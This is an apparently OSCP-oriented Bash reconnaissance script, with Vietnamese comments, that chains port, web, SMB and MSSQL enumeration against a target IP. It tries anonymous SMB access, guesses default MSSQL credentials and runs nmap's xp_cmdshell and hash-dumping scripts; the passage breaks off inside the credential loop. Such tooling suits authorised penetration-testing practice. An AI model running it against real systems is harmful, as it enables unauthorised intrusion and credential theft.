#!/bin/bash
# OSCP+ Advanced Reconnaissance Script with Deep Scanning
# Sử dụng: ./oscp_advanced_recon.sh <IP>

if [ -z "$1" ]; then
    echo "Usage: $0 <IP>"
    exit 1
fi

TARGET=$1
OUTPUT_DIR="recon_$TARGET"
VULNS_DIR="$OUTPUT_DIR/vulnerabilities"
THREADS=50  # Thread mặc định cho quá trình quét

mkdir -p $OUTPUT_DIR
mkdir -p $VULNS_DIR
echo "[+] Starting advanced reconnaissance on $TARGET. Results will be saved to $OUTPUT_DIR/"

# Kiểm tra các công cụ bắt buộc
check_tools() {
    local missing=0
    local tools=("nmap" "nikto" "gobuster" "whatweb" "wpscan" "nuclei" "dirsearch" "smbmap" "enum4linux" "onesixtyone" "ffuf" "feroxbuster")
    
    echo "[*] Checking required tools..."
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            echo "[-] $tool is not installed"
            missing=1
        fi
    done
    
    if [ $missing -eq 1 ]; then
        echo "[-] Some tools are missing. Install them before running this script."
        echo "[*] You can install most tools with: apt install <tool-name>"
        echo "[*] For nuclei: go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest"
        echo "[*] For dirsearch: git clone https://github.com/maurosoria/dirsearch.git"
        echo "[*] For feroxbuster: apt install feroxbuster or cargo install feroxbuster"
        echo "[*] For ffuf: go install github.com/ffuf/ffuf/v2@latest"
        exit 1
    fi
    
    echo "[+] All required tools are installed"
}

# Banner với thông tin target
echo "
#############################################################
#            OSCP+ Enhanced Target Reconnaissance           #
#############################################################
# Target: $TARGET
# Date: $(date)
# Output Directory: $OUTPUT_DIR
#############################################################
"

# Kiểm tra công cụ
check_tools

# Lưu thông tin lỗ hổng
save_vulnerability() {
    local port=$1
    local service=$2
    local vuln_name=$3
    local severity=$4
    local description=$5
    local reference=$6

    # Tạo thư mục dựa trên port và service
    local vuln_dir="$VULNS_DIR/${port}_${service}"
    mkdir -p "$vuln_dir"
    
    # Tạo tên file an toàn
    local safe_name=$(echo "$vuln_name" | tr ' /:*?"<>|' '_')
    
    # Tạo file markdown cho lỗ hổng
    {
        echo "# $vuln_name"
        echo ""
        echo "## Details"
        echo "- **Port**: $port"
        echo "- **Service**: $service"
        echo "- **Severity**: $severity"
        echo "- **Date**: $(date)"
        echo ""
        echo "## Description"
        echo "$description"
        echo ""
        if [ -n "$reference" ]; then
            echo "## References"
            echo "$reference"
        fi
    } > "$vuln_dir/${safe_name}.md"
    
    # Thêm vào file tổng hợp lỗ hổng
    {
        echo "| $port | $service | $vuln_name | $severity |"
    } >> "$OUTPUT_DIR/vulnerabilities_list.md"
}

# Khởi tạo file danh sách lỗ hổng
{
    echo "# Vulnerabilities Found"
    echo ""
    echo "| Port | Service | Vulnerability | Severity |"
    echo "|------|---------|---------------|----------|"
} > "$OUTPUT_DIR/vulnerabilities_list.md"

# Chức năng mới: Xác định dịch vụ đang chạy trên cổng
identify_service() {
    local port=$1
    local output_file="$OUTPUT_DIR/service_detection_${port}.txt"
    
    echo "[+] Identifying service on port $port..."
    
    # Sử dụng nmap với chế độ nâng cao để xác định dịch vụ
    nmap -n -Pn -sV --version-all -p $port --version-intensity 9 $TARGET -oN "$output_file"
    
    # Trích xuất thông tin dịch vụ
    if [ -f "$output_file" ]; then
        local service_info=$(grep -A 5 "^$port/" "$output_file" | head -n 1)
        local service_name=$(echo "$service_info" | grep -oP "\d+/\w+\s+\w+\s+\K[^/]*" | sed 's/[ \t]*$//')
        local version=$(echo "$service_info" | grep -oP "\d+/\w+\s+\w+\s+[^/]*\K.*$" | sed 's/^[ \t]*//')
        
        echo "[+] Port $port: $service_name $version"
        echo "Port $port: $service_name $version" >> "$OUTPUT_DIR/service_versions.txt"
        
        # Phân tích các gói service probe bổ sung để tìm dấu hiệu phiên bản
        if [[ -z "$version" || "$version" == " " ]]; then
            echo "[+] Running advanced service fingerprinting on port $port..."
            sudo nmap -n -Pn --script banner -p $port $TARGET -oN "$OUTPUT_DIR/banner_${port}.txt"
            
            # Trích xuất banner
            local banner=$(grep -A 5 "banner" "$OUTPUT_DIR/banner_${port}.txt" | grep -v "banner" | grep -v "|_" | sed 's/|_*//' | sed 's/^[ \t]*//')
            
            if [[ -n "$banner" ]]; then
                echo "[+] Banner for port $port: $banner"
                echo "Banner: $banner" >> "$OUTPUT_DIR/service_versions.txt"
            fi
        fi
    fi
}

# 1. Initial Port Scanning
echo "[+] Starting initial port discovery scan..."
nmap -n -Pn -sS --min-rate=1000 -T4 -p- $TARGET -oN $OUTPUT_DIR/nmap_allinitial.txt

# Extract open ports for detailed scanning - Cải tiến phát hiện cổng
if [ -f "$OUTPUT_DIR/nmap_allinitial.txt" ]; then
    # Cách trích xuất cổng mới, hiệu quả hơn
    grep -A 100 "PORT" "$OUTPUT_DIR/nmap_allinitial.txt" | grep "open" | awk '{print $1}' | cut -d'/' -f1 > "$OUTPUT_DIR/open_ports_list.txt"
    
    # Tạo danh sách cổng được phân tách bằng dấu phẩy
    OPEN_PORTS=$(tr '\n' ',' < "$OUTPUT_DIR/open_ports_list.txt" | sed 's/,$//')
    
    # Kiểm tra xem đã phát hiện cổng mở chưa
    if [ -z "$OPEN_PORTS" ]; then
        echo "[-] Không trích xuất được cổng mở, thử phương pháp khác..."
        # Phương pháp trích xuất thứ 2
        OPEN_PORTS=$(grep -oP '\d+/open' "$OUTPUT_DIR/nmap_allinitial.txt" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')
    fi
    
    # Nếu vẫn không tìm thấy, thử phương pháp thứ 3
    if [ -z "$OPEN_PORTS" ]; then
        echo "[-] Vẫn không phát hiện được cổng mở. Thử phương pháp cuối cùng..."
        # Tìm tất cả các dòng có từ "open" và trích xuất số cổng
        OPEN_PORTS=$(grep "open" "$OUTPUT_DIR/nmap_allinitial.txt" | grep -v "filtered" | grep -oP '^\s*\K\d+' | tr '\n' ',' | sed 's/,$//')
    fi
    
    echo "[+] Open ports: $OPEN_PORTS"
    echo "[+] Open ports: $OPEN_PORTS" > $OUTPUT_DIR/open_ports.txt
    
    # Khởi tạo file phiên bản dịch vụ
    echo "# Service Version Information - $TARGET" > "$OUTPUT_DIR/service_versions.txt"
    echo "Scan date: $(date)" >> "$OUTPUT_DIR/service_versions.txt"
    echo "----------------------------------------" >> "$OUTPUT_DIR/service_versions.txt"
    
    if [ -n "$OPEN_PORTS" ]; then
        # TÍNH NĂNG MỚI: Phát hiện dịch vụ chi tiết trên từng cổng
        echo "[+] Starting enhanced service detection on all open ports..."
        for port in $(echo $OPEN_PORTS | tr ',' ' '); do
            identify_service $port
        done
        
        # 2. Detailed Scan on Open Ports
        echo "[+] Running detailed scan on open ports..."
        nmap -n -Pn -sV -sC -O -p$OPEN_PORTS --version-all --version-intensity 9 $TARGET -oA $OUTPUT_DIR/nmap_detailed
        
        # 3. UDP Scan on top ports
        echo "[+] Running UDP scan on common ports..."
        sudo nmap -n -Pn -sU --top-ports=20 $TARGET -oA $OUTPUT_DIR/nmap_udp
        
        # 4. Vulnerability Scan (if ports are detected)
        echo "[+] Running vulnerability scan..."
        nmap -n -Pn -sV --script vuln -p$OPEN_PORTS $TARGET -oA $OUTPUT_DIR/nmap_vuln
        
        # Phân tích kết quả nmap vuln để tìm lỗ hổng
        if [ -f "$OUTPUT_DIR/nmap_vuln.nmap" ]; then
            echo "[+] Analyzing vulnerability scan results..."
            
            # Trích xuất thông tin lỗ hổng
            grep -A 20 "VULNERABLE" "$OUTPUT_DIR/nmap_vuln.nmap" | while read -r line; do
                if [[ $line == *"VULNERABLE"* ]]; then
                    vuln_port=$(echo "$line" | grep -oP '^\d+/' | tr -d '/')
                    vuln_service=$(grep -A 1 "^$vuln_port/" "$OUTPUT_DIR/nmap_detailed.nmap" | grep -oP '^\d+/\w+\s+\w+\s+\K\w+')
                    vuln_name=$(echo "$line" | grep -oP 'VULNERABLE:\s*\K.*$')
                    
                    # Trích xuất thông tin chi tiết
                    vuln_desc=$(grep -A 10 "$line" "$OUTPUT_DIR/nmap_vuln.nmap" | grep -v "VULNERABLE" | tr -d '\n' | sed 's/^\s*//g')
                    
                    # Xác định mức độ nghiêm trọng dựa trên từ khóa
                    severity="Medium"
                    if [[ $vuln_desc == *"critical"* ]] || [[ $vuln_desc == *"Critical"* ]]; then
                        severity="Critical"
                    elif [[ $vuln_desc == *"high"* ]] || [[ $vuln_desc == *"High"* ]]; then
                        severity="High"
                    elif [[ $vuln_desc == *"low"* ]] || [[ $vuln_desc == *"Low"* ]]; then
                        severity="Low"
                    fi
                    
                    # Trích xuất tham chiếu CVE
                    reference=$(echo "$vuln_desc" | grep -oP 'CVE-\d+-\d+' | tr '\n' ', ')
                    
                    # Lưu thông tin lỗ hổng
                    save_vulnerability "$vuln_port" "$vuln_service" "$vuln_name" "$severity" "$vuln_desc" "$reference"
                    
                    echo "[!] Found vulnerability: $vuln_name on port $vuln_port/$vuln_service (Severity: $severity)"
                fi
            done
        fi
    else
        echo "[-] No open ports found in the scan. Using default ports for further testing."
        # Sử dụng các cổng mặc định phổ biến
        OPEN_PORTS="21,22,80,443,445,3389"
        echo "[+] Using default ports: $OPEN_PORTS"
        echo "[+] Open ports (default): $OPEN_PORTS" > $OUTPUT_DIR/open_ports.txt
        
        # Thực hiện quét với các cổng mặc định
        echo "[+] Running detailed scan on default ports..."
        nmap -n -Pn -sV -sC -O -p$OPEN_PORTS --version-all $TARGET -oA $OUTPUT_DIR/nmap_detailed
    fi
else
    echo "[-] Initial scan failed. Please check target availability."
    exit 1
fi

# TÍNH NĂNG MỚI: Quét đệ quy thư mục web
recursive_directory_scan() {
    local url=$1
    local output_dir=$2
    local depth=$3
    local wordlist=$4
    
    if [ -z "$depth" ]; then
        depth=2  # Độ sâu mặc định
    fi
    
    if [ -z "$wordlist" ]; then
        wordlist="/usr/share/wordlists/dirb/common.txt"
        
        # Sử dụng wordlist lớn hơn nếu có
        if [ -f "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" ]; then
            wordlist="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
        fi
    fi
    
    echo "[+] Running recursive directory scan on $url with depth $depth..."
    
    # 1. Sử dụng feroxbuster cho quét đệ quy
    if command -v feroxbuster &> /dev/null; then
        echo "[+] Using feroxbuster for recursive scanning with depth $depth..."
        feroxbuster --url $url \
                   --depth $depth \
                   --wordlist $wordlist \
                   --threads $THREADS \
                   --output "$output_dir/feroxbuster_recursive.txt" \
                   --extract-links \
                   --auto-bail \
                   --silent
    else
        echo "[-] feroxbuster not found, using alternative tools..."
    fi
    
    # 3. Sử dụng gobuster để quét với nhiều extensions
    echo "[+] Using gobuster for targeted file scanning..."
    gobuster dir -u $url \
                -w $wordlist \
                -t $THREADS \
                -x php,txt,html,htm,asp,aspx,jsp,do,action,cgi,pl,sh,py,rb,bak,old,backup,config,conf,cfg,ini,db,sql,tar,gz,zip,7z \
                -o "$output_dir/gobuster_files.txt" 2>/dev/null
                
    # 4. Tìm các đường dẫn ẩn/backup
    echo "[+] Searching for hidden/backup paths..."
    custom_wordlist=$(mktemp)
    
    # Tạo wordlist tùy chỉnh cho các đường dẫn ẩn phổ biến
    cat > $custom_wordlist << EOL
.git
.svn
.htaccess
.htpasswd
.DS_Store
backup
old
archive
dev
test
temp
bak
config
database
admin
administrator
panel
dev
api
swagger
actuator
robots.txt
sitemap.xml
EOL

    gobuster dir -u $url \
                -w $custom_wordlist \
                -t 20 \
                -o "$output_dir/gobuster_hidden.txt" 2>/dev/null
    
    rm $custom_wordlist
    
    # 5. Phân tích kết quả để tìm các đường dẫn thú vị
    echo "[+] Analyzing scan results for interesting paths..."
    mkdir -p "$output_dir/interesting_paths"
    
    # Tìm các đường dẫn thú vị từ kết quả feroxbuster
    if [ -f "$output_dir/feroxbuster_recursive.txt" ]; then
        grep -E "200|301|302|403" "$output_dir/feroxbuster_recursive.txt" | grep -E "\.(zip|tar|gz|bak|backup|old|conf|config|sql|db|ini)" > "$output_dir/interesting_paths/archive_config_files.txt"
        grep -E "200|301|302" "$output_dir/feroxbuster_recursive.txt" | grep -E "(admin|administrator|login|portal|dashboard|manage|config|setup)" > "$output_dir/interesting_paths/admin_paths.txt"
    fi
    
    # Tìm các đường dẫn thú vị từ kết quả gobuster
    if [ -f "$output_dir/gobuster_files.txt" ]; then
        grep -E "Status: 200|Status: 301|Status: 302|Status: 403" "$output_dir/gobuster_files.txt" | grep -E "\.(zip|tar|gz|bak|backup|old|conf|config|sql|db|ini)" >> "$output_dir/interesting_paths/archive_config_files.txt"
        grep -E "Status: 200|Status: 301|Status: 302" "$output_dir/gobuster_files.txt" | grep -E "(admin|administrator|login|portal|dashboard|manage|config|setup)" >> "$output_dir/interesting_paths/admin_paths.txt"
    fi
}

# 5. Service-specific enumeration
echo "[+] Running service-specific enumeration..."

# Check for HTTP/HTTPS services
if echo "$OPEN_PORTS" | grep -q "80\|443\|8080\|8443"; then
    echo "[+] Web services detected, running advanced web enumeration..."
    
    # Extract web ports
    WEB_PORTS=$(echo "$OPEN_PORTS" | tr ',' '\n' | grep -E "^80$|^443$|^8080$|^8443$" | tr '\n' ',' | sed 's/,$//')
    
    # Create directory for web scans
    mkdir -p "$OUTPUT_DIR/web_scans"
    
    # Scan each web port
    for port in $(echo $WEB_PORTS | tr ',' ' '); do
        if [ "$port" == "443" ] || [ "$port" == "8443" ]; then
            PROTOCOL="https"
        else
            PROTOCOL="http"
        fi
        
        # Create port-specific directory
        WEB_PORT_DIR="$OUTPUT_DIR/web_scans/${port}"
        mkdir -p "$WEB_PORT_DIR"
        
        echo "[+] Enumerating $PROTOCOL://$TARGET:$port/"
        
        # Whatweb scan - basic identification
        echo "[+] Running WhatWeb on $PROTOCOL://$TARGET:$port/"
        whatweb -a 3 $PROTOCOL://$TARGET:$port/ > "$WEB_PORT_DIR/whatweb.txt" 2>/dev/null
        
        # Get page title
        echo "[+] Getting page title"
        curl -s -L -k "$PROTOCOL://$TARGET:$port/" | grep -i "<title>" | sed 's/<[^>]*>//g' > "$WEB_PORT_DIR/title.txt" 2>/dev/null
        
        # Screenshot with cutycapt (if available)
        if command -v cutycapt &> /dev/null; then
            echo "[+] Taking screenshot of $PROTOCOL://$TARGET:$port/"
            cutycapt --url=$PROTOCOL://$TARGET:$port/ --out="$WEB_PORT_DIR/screenshot.png" 2>/dev/null
        fi
        
        # 5.1 Analyze web application technologies
        grep -i "WordPress\|Joomla\|Drupal\|PHP\|Apache\|Nginx\|IIS" "$WEB_PORT_DIR/whatweb.txt" > "$WEB_PORT_DIR/technologies.txt" 2>/dev/null
        
        # 5.2 Nikto scan - general security issues
        echo "[+] Running Nikto on $PROTOCOL://$TARGET:$port/"
        nikto -h $PROTOCOL://$TARGET:$port/ -o "$WEB_PORT_DIR/nikto.txt" 2>/dev/null
        
        # Extract vulnerabilities from Nikto
        if [ -f "$WEB_PORT_DIR/nikto.txt" ]; then
            grep -i "OSVDB\|vulnerable\|vulnerability\|XSS\|SQL\|injection\|overflow" "$WEB_PORT_DIR/nikto.txt" > "$WEB_PORT_DIR/nikto_vulns.txt"
            
            # Process each vulnerability
            cat "$WEB_PORT_DIR/nikto_vulns.txt" | while read -r line; do
                vuln_name=$(echo "$line" | grep -oP 'OSVDB-\d+:|ID:\s*\K.*?\s*-' | sed 's/://' | sed 's/-$//')
                if [ -z "$vuln_name" ]; then
                    vuln_name="Web Vulnerability"
                fi
                
                severity="Medium"
                if [[ $line == *"XSS"* ]] || [[ $line == *"SQL injection"* ]] || [[ $line == *"Remote Code"* ]]; then
                    severity="High"
                elif [[ $line == *"information disclosure"* ]] || [[ $line == *"Information Disclosure"* ]]; then
                    severity="Low"
                fi
                
                save_vulnerability "$port" "web" "$vuln_name" "$severity" "$line" ""
            done
        fi
        
        # 5.3 Nuclei - template-based scanning
        if command -v nuclei &> /dev/null; then
            echo "[+] Running Nuclei on $PROTOCOL://$TARGET:$port/"
            mkdir -p "$WEB_PORT_DIR/nuclei"
            nuclei -u $PROTOCOL://$TARGET:$port/ -o "$WEB_PORT_DIR/nuclei/results.txt" -silent
            
            # Extract vulnerabilities from Nuclei
            if [ -f "$WEB_PORT_DIR/nuclei/results.txt" ]; then
                cat "$WEB_PORT_DIR/nuclei/results.txt" | while read -r line; do
                    vuln_name=$(echo "$line" | awk '{print $5}' | sed 's/\[//' | sed 's/\]//')
                    severity=$(echo "$line" | awk '{print $2}' | sed 's/\[//' | sed 's/\]//')
                    
                    if [ -z "$severity" ]; then
                        severity="Medium"
                    fi
                    
                    save_vulnerability "$port" "web" "$vuln_name" "$severity" "$line" ""
                done
            fi
        fi
        
        # TÍNH NĂNG MỚI: Quét đệ quy thư mục web với độ sâu cao
        echo "[+] Starting deep recursive directory scanning..."
        mkdir -p "$WEB_PORT_DIR/recursive_scan"
        
        # Thực hiện quét đệ quy với độ sâu 3 (có thể điều chỉnh theo nhu cầu)
        recursive_directory_scan "$PROTOCOL://$TARGET:$port" "$WEB_PORT_DIR/recursive_scan" 3
        
        # Thực hiện quét chi tiết với danh sách từ lớn hơn cho đường dẫn chính
        if [ -f "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" ]; then
            echo "[+] Running detailed directory scan with larger wordlist..."
            gobuster dir -u $PROTOCOL://$TARGET:$port/ \
                        -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
                        -t $THREADS \
                        -o "$WEB_PORT_DIR/gobuster/medium_wordlist.txt" 2>/dev/null
        fi
        
        # Tìm kiếm các endpoints API
        echo "[+] Searching for API endpoints..."
        api_wordlist=$(mktemp)
        cat > $api_wordlist << EOL
api
v1
v2
v3
swagger
docs
redoc
graphql
graphiql
playground
rest
json
soap
xml
admin
user
users
account
accounts
auth
login
data
service
services
EOL

        gobuster dir -u $PROTOCOL://$TARGET:$port/ \
                    -w $api_wordlist \
                    -t 20 \
                    -o "$WEB_PORT_DIR/api_endpoints.txt" 2>/dev/null
        
        rm $api_wordlist
        
        # 5.4 Dirsearch - directory and file brute force (giữ lại để tương thích)
        if command -v dirsearch &> /dev/null; then
            echo "[+] Running Dirsearch on $PROTOCOL://$TARGET:$port/"
            mkdir -p "$WEB_PORT_DIR/dirsearch"
            python3 $(which dirsearch) -u $PROTOCOL://$TARGET:$port/ -e php,asp,aspx,jsp,js,txt,conf,config,bak,backup,swp,old,db,sql,git -t 50 -b -w /usr/share/wordlists/dirb/common.txt -o "$WEB_PORT_DIR/dirsearch/results.txt" -q 2>/dev/null
        fi
        
        # 5.5 Gobuster - alternative directory and file brute force
        echo "[+] Running Gobuster on $PROTOCOL://$TARGET:$port/"
        mkdir -p "$WEB_PORT_DIR/gobuster"
        gobuster dir -u $PROTOCOL://$TARGET:$port/ -w /usr/share/wordlists/dirb/common.txt -q -o "$WEB_PORT_DIR/gobuster/common.txt" 2>/dev/null
        gobuster dir -u $PROTOCOL://$TARGET:$port/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,zip,bak,old -q -o "$WEB_PORT_DIR/gobuster/extensions.txt" 2>/dev/null
        
        # 5.6 Check for WordPress
        if grep -q -i "WordPress" "$WEB_PORT_DIR/whatweb.txt" || grep -q -i "WordPress" "$WEB_PORT_DIR/technologies.txt"; then
            echo "[+] WordPress detected, running WPScan on $PROTOCOL://$TARGET:$port/"
            mkdir -p "$WEB_PORT_DIR/wordpress"
            wpscan --url $PROTOCOL://$TARGET:$port/ --no-banner --format cli-no-color > "$WEB_PORT_DIR/wordpress/wpscan.txt" 2>/dev/null
            
            # Extract vulnerabilities from WPScan
            if [ -f "$WEB_PORT_DIR/wordpress/wpscan.txt" ]; then
                grep -A 3 "\[!\]" "$WEB_PORT_DIR/wordpress/wpscan.txt" > "$WEB_PORT_DIR/wordpress/wpscan_vulns.txt"
                
                # Process each vulnerability
                cat "$WEB_PORT_DIR/wordpress/wpscan_vulns.txt" | grep "\[!\]" | while read -r line; do
                    vuln_name=$(echo "$line" | sed 's/\[!\] //')
                    severity="Medium"
                    
                    if [[ $vuln_name == *"Critical"* ]]; then
                        severity="Critical"
                    elif [[ $vuln_name == *"High"* ]]; then
                        severity="High"
                    elif [[ $vuln_name == *"Low"* ]]; then
                        severity="Low"
                    fi
                    
                    save_vulnerability "$port" "WordPress" "$vuln_name" "$severity" "$line" ""
                done
            fi
            
            # Quét đệ quy các thư mục WordPress
            echo "[+] Scanning WordPress specific directories..."
            wp_dirs=("wp-content/uploads" "wp-content/plugins" "wp-content/themes" "wp-admin" "wp-includes")
            for wp_dir in "${wp_dirs[@]}"; do
                gobuster dir -u $PROTOCOL://$TARGET:$port/$wp_dir/ \
                           -w /usr/share/wordlists/dirb/common.txt \
                           -t $THREADS \
                           -o "$WEB_PORT_DIR/wordpress/${wp_dir//\//_}_dir.txt" 2>/dev/null
            done
        fi
        
        # 5.7 Check for Joomla
        if grep -q -i "Joomla" "$WEB_PORT_DIR/whatweb.txt" || grep -q -i "Joomla" "$WEB_PORT_DIR/technologies.txt"; then
            echo "[+] Joomla detected on $PROTOCOL://$TARGET:$port/"
            mkdir -p "$WEB_PORT_DIR/joomla"
            
            # Check for common Joomla paths
            for path in administrator components modules templates; do
                curl -s -o /dev/null -w "%{http_code}" $PROTOCOL://$TARGET:$port/$path/ > "$WEB_PORT_DIR/joomla/${path}_status.txt"
            done
            
            # Run Joomscan if available
            if command -v joomscan &> /dev/null; then
                joomscan --url $PROTOCOL://$TARGET:$port/ -ec > "$WEB_PORT_DIR/joomla/joomscan.txt" 2>/dev/null
            fi
            
            # Quét đệ quy các thư mục Joomla
            echo "[+] Scanning Joomla specific directories..."
            joomla_dirs=("administrator" "components" "modules" "templates" "language" "plugins" "includes" "cache" "images" "media")
            for jdir in "${joomla_dirs[@]}"; do
                gobuster dir -u $PROTOCOL://$TARGET:$port/$jdir/ \
                           -w /usr/share/wordlists/dirb/common.txt \
                           -t $THREADS \
                           -o "$WEB_PORT_DIR/joomla/${jdir}_dir.txt" 2>/dev/null
            done
        fi
        
        # 5.8 Check for Drupal
        if grep -q -i "Drupal" "$WEB_PORT_DIR/whatweb.txt" || grep -q -i "Drupal" "$WEB_PORT_DIR/technologies.txt"; then
            echo "[+] Drupal detected on $PROTOCOL://$TARGET:$port/"
            mkdir -p "$WEB_PORT_DIR/drupal"
            
            # Check for common Drupal paths
            for path in admin user sites CHANGELOG.txt; do
                curl -s -o /dev/null -w "%{http_code}" $PROTOCOL://$TARGET:$port/$path/ > "$WEB_PORT_DIR/drupal/${path}_status.txt"
            done
            
            # Run droopescan if available
            if command -v droopescan &> /dev/null; then
                droopescan scan drupal -u $PROTOCOL://$TARGET:$port/ > "$WEB_PORT_DIR/drupal/droopescan.txt" 2>/dev/null
            fi
            
            # Quét đệ quy các thư mục Drupal
            echo "[+] Scanning Drupal specific directories..."
            drupal_dirs=("sites" "modules" "themes" "includes" "misc" "profiles" "scripts")
            for ddir in "${drupal_dirs[@]}"; do
                gobuster dir -u $PROTOCOL://$TARGET:$port/$ddir/ \
                           -w /usr/share/wordlists/dirb/common.txt \
                           -t $THREADS \
                           -o "$WEB_PORT_DIR/drupal/${ddir}_dir.txt" 2>/dev/null
            done
        fi
        
        # Tìm kiếm virtual hosts
        echo "[+] Searching for virtual hosts..."
        mkdir -p "$WEB_PORT_DIR/vhosts"
        
        # Tạo danh sách các virtual host tiềm năng
        vhost_wordlist=$(mktemp)
        echo "$TARGET" > $vhost_wordlist
        echo "www.$TARGET" >> $vhost_wordlist
        echo "dev.$TARGET" >> $vhost_wordlist
        echo "stage.$TARGET" >> $vhost_wordlist
        echo "test.$TARGET" >> $vhost_wordlist
        echo "admin.$TARGET" >> $vhost_wordlist
        echo "api.$TARGET" >> $vhost_wordlist
        echo "app.$TARGET" >> $vhost_wordlist
        echo "mail.$TARGET" >> $vhost_wordlist
        echo "support.$TARGET" >> $vhost_wordlist
        echo "portal.$TARGET" >> $vhost_wordlist
        
        # Kiểm tra virtual hosts
        while read vhost; do
            status_code=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: $vhost" $PROTOCOL://$TARGET:$port/)
            echo "$vhost: $status_code" >> "$WEB_PORT_DIR/vhosts/vhost_results.txt"
            
            # Nếu trả về 200, có thể đó là một vhost hợp lệ
            if [ "$status_code" == "200" ]; then
                echo "[+] Potential vhost found: $vhost ($status_code)"
            fi
        done < $vhost_wordlist
        
        rm $vhost_wordlist
    done
fi

# Check for SMB service
if echo "$OPEN_PORTS" | grep -q "139\|445"; then
    echo "[+] SMB services detected, running advanced SMB enumeration..."
    
    # Create directory for SMB scans
    mkdir -p "$OUTPUT_DIR/smb_scans"
    
    # SMB OS and version detection
    nmap -p 139,445 --script smb-os-discovery $TARGET -oN "$OUTPUT_DIR/smb_scans/os_discovery.txt"
    
    # SMB vulnerability scanning
    nmap -p 139,445 --script smb-vuln* $TARGET -oN "$OUTPUT_DIR/smb_scans/vulnerabilities.txt"
    
    # Enhanced SMB version detection
    echo "[+] Performing detailed SMB version detection..."
    nmap -p 139,445 --script smb-protocols $TARGET -oN "$OUTPUT_DIR/smb_scans/smb_protocols.txt"
    
    # Extract SMB vulnerabilities
    if [ -f "$OUTPUT_DIR/smb_scans/vulnerabilities.txt" ]; then
        grep -A 10 "VULNERABLE" "$OUTPUT_DIR/smb_scans/vulnerabilities.txt" | while read -r line; do
            if [[ $line == *"VULNERABLE"* ]]; then
                vuln_name=$(echo "$line" | grep -oP 'VULNERABLE:\s*\K.*)' | sed 's/)//')
                
                # Extract severity based on known vulnerabilities
                severity="High"
                if [[ $vuln_name == *"MS17-010"* ]]; then
                    severity="Critical"
                fi
                
                # Get description
                vuln_desc=$(grep -A 10 "$line" "$OUTPUT_DIR/smb_scans/vulnerabilities.txt" | grep -v "VULNERABLE" | tr -d '\n' | sed 's/^\s*//g')
                
                # Save vulnerability
                save_vulnerability "445" "SMB" "$vuln_name" "$severity" "$vuln_desc" ""
                
                echo "[!] Found SMB vulnerability: $vuln_name (Severity: $severity)"
            fi
        done
    fi
    
    # Enumerate shares with smbmap
    smbmap -H $TARGET -u anonymous > "$OUTPUT_DIR/smb_scans/smbmap_anonymous.txt" 2>/dev/null
    smbmap -H $TARGET -u "" -p "" > "$OUTPUT_DIR/smb_scans/smbmap_null.txt" 2>/dev/null
    
    # Try to list shares with smbclient
    smbclient -L $TARGET -N > "$OUTPUT_DIR/smb_scans/smbclient_shares.txt" 2>/dev/null
    
    # Run enum4linux - comprehensive enumeration
    enum4linux -a $TARGET > "$OUTPUT_DIR/smb_scans/enum4linux.txt" 2>/dev/null
    
    # Tính năng mới: Thử liệt kê tất cả users và quét sâu hơn
    echo "[+] Attempting to enumerate users via SMB..."
    nmap -p 139,445 --script smb-enum-users --script-args smbuser=guest,smbpass= $TARGET -oN "$OUTPUT_DIR/smb_scans/smb_users.txt"
    
    # Thử liệt kê tất cả shares và permissions
    echo "[+] Enumerating all shares and permissions..."
    nmap -p 139,445 --script smb-enum-shares,smb-enum-sessions $TARGET -oN "$OUTPUT_DIR/smb_scans/smb_shares_detailed.txt"
    
    # Thử xem có shared folders có thể truy cập không
    echo "[+] Checking for accessible shares..."
    if [ -f "$OUTPUT_DIR/smb_scans/smbclient_shares.txt" ]; then
        grep "Disk" "$OUTPUT_DIR/smb_scans/smbclient_shares.txt" | awk '{print $1}' | while read -r share; do
            echo "[+] Trying to access share: $share"
            smbclient "//$TARGET/$share" -N -c "ls" > "$OUTPUT_DIR/smb_scans/shares/${share}_content.txt" 2>/dev/null
            
            # Kiểm tra xem có đọc được nội dung không
            if [ -s "$OUTPUT_DIR/smb_scans/shares/${share}_content.txt" ]; then
                echo "[!] Successfully accessed share: $share"
                save_vulnerability "445" "SMB" "Accessible Share: $share" "Medium" "The SMB share '$share' can be accessed without authentication, potentially exposing sensitive data." ""
            fi
        done
    fi
    
    # Analyze results for open shares
    if grep -q "READ\|WRITE" "$OUTPUT_DIR/smb_scans/smbmap_anonymous.txt"; then
        echo "[!] Found accessible SMB shares with anonymous access"
        grep "READ\|WRITE" "$OUTPUT_DIR/smb_scans/smbmap_anonymous.txt" > "$OUTPUT_DIR/smb_scans/accessible_shares.txt"
        
        # Add as vulnerability
        save_vulnerability "445" "SMB" "Anonymous SMB Share Access" "Medium" "One or more SMB shares allow anonymous access, which could lead to sensitive information disclosure." ""
    fi
fi

# Check for MSSQL service
if echo "$OPEN_PORTS" | grep -q "1433"; then
    echo "[+] MSSQL service detected, running advanced MSSQL enumeration..."
    
    # Create directory for MSSQL scans
    mkdir -p "$OUTPUT_DIR/mssql_scans"
    
    # Enhanced MSSQL service detection
    echo "[+] Performing detailed MSSQL version detection..."
    nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 $TARGET -oN "$OUTPUT_DIR/mssql_scans/mssql_version.txt"
    
    # MSSQL enumeration and vulnerability scanning
    nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=sa -oA "$OUTPUT_DIR/mssql_scans/nmap_mssql" $TARGET
    
    # Thử nhiều username/password phổ biến
    echo "[+] Testing common MSSQL credentials..."
    common_creds=("sa:sa" "sa:" "sa:password" "sa:Password123" "admin:admin" "administrator:administrator")
    
    for cred in "${common_creds[@]}"; do
        username=$(echo $cred | cut -d':' -f1)
        password=$(echo $cred | cut -d':' -f2)
        
        echo "[+] Trying credentials: $username / $password"
        nmap -p 1433 --script ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-tables --script-args mssql.username=$username,mssql.password=$password $TARGET -oN "$OUTPUT_DIR/mssql_scans/creds_${username}_${password}.txt"
        
